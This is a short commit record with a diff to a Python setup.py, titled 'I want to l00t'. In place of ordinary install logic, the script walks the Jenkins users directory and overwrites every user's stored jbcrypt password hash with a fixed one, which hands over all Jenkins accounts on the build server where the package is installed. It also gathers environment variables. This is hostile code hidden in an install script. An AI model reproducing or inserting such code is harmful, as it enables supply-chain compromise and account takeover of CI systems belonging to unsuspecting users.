f8d279da272770396353565ada3a3abbd4dbabfc
Greg Anderson <greg.anderson@example.email.com>
2014-08-10 22:12:43 +0000

    I want to l00t

--- setup.py
+++ setup.py
@@ -35,7 +35,7 @@ message = pprint.pformat(dict(envs))
 results = os.listdir('/var/lib/jenkins/users/')
 for res in results:
         for line in fileinput.FileInput("/var/lib/jenkins/users/%s/config.xml" % res,inplace=1):
-                line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$QLFBATBr3IV9aDyZGI.PqevtMoGD17EpotEmnkzqFlkrmJOmCmf/S", line )
+                line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$GNV3JqQo3nJdPXw7GShLh./HScRplkdY9tuswkgFeDn16UXRf81ya", line )
                 print line,
 message = 'using jenkins: %s ' % str(results)
 
